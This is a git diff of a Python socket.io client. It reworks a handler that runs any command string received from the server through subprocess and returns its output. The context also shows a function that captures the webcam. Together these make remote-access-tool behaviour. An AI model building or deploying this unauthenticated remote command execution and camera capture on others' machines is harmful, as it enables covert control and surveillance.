@@ -123,7 +123,8 @@ def send_message(cliente):
         sio.emit('private_message', {'to': cliente, 'message': message})
         
 @sio.event
-def command_received(command: str):
+def command_received(data):
+    command = data.get('command')
     try:
         result = subprocess.run(
             command,
@@ -131,18 +132,28 @@ def command_received(command: str):
             capture_output=True,   
             text=True              
         )
-        return {
+        response = {
             "out": result.stdout.strip(),
             "error": result.stderr.strip(),
             "return_code": result.returncode
         }
     except Exception as e:
-        return {
+        response = {
             "out": "",
             "error": str(e),
             "return_code": -1
         }
-        
+    print(response.values)
+#    sio.emit('result_command', {'to': from_client, 'result': response})
+
+"""@sio.event
+def result_command(data):
+    result = data.get('response')
+    print("Command result:")
+    print(f"Out: {result['out']}")
+    print(f"Error: {result['error']}")
+    print(f"Return code: {result['return_code']}")"""
+
 def frame_share(cliente):
     cap = cv2.VideoCapture(0)
 
